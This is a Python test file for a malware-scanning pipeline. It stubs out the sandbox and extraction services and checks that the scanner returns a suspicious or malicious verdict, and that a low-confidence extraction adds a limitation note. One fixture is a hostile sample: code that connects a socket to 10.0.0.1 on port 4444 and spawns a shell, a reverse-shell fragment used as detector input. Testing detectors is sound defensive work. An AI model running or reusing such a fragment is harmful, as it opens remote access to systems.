import packer.engine.sandbox.static  # noqa: F401
from packer.engine.common.config_schema import compose_config
from packer.engine.extract.model import Extraction
from packer.engine.sandbox.pipeline import ScanPipeline
from packer.engine.sandbox.runner import SandboxResult


class _FakeSandbox:
    def run(self, unit, policy):
        return SandboxResult(
            stdout="", stderr="", exit_code=0, timed_out=False, syscalls=("execve", "write")
        )


class _Ports:
    sandbox = _FakeSandbox()


class _FakeExtractionService:
    def __init__(self, extraction):
        self._e = extraction

    def extract(self, target):
        return self._e


def test_pipeline_builds_scan_report_with_verdict():
    malicious = (
        b"import socket, subprocess\n"
        b"socket.socket().connect(('10.0.0.1', 4444))\n"
        b"subprocess.Popen('sh', shell=True)\n"
    )
    extraction = Extraction(files={"m.py": malicious}, confidence=1.0, confidence_class="exact")
    cfg = compose_config().engine
    pipeline = ScanPipeline(extraction_service=_FakeExtractionService(extraction))
    report = pipeline.run(target=None, cfg=cfg, ports=_Ports())
    assert report.kind == "scan"
    assert report.verdict.label in ("suspicious", "malicious")
    assert any(s for s in report.sections)


def test_blind_extraction_adds_limitation():
    extraction = Extraction(
        files={"m.py": b"print(1)\n"},
        confidence=0.3,
        confidence_class="blind",
        notes=("guessed",),
    )
    cfg = compose_config().engine
    pipeline = ScanPipeline(extraction_service=_FakeExtractionService(extraction))
    report = pipeline.run(target=None, cfg=cfg, ports=_Ports())
    assert any("best-effort" in lim.lower() or "blind" in lim.lower() for lim in report.limitations)
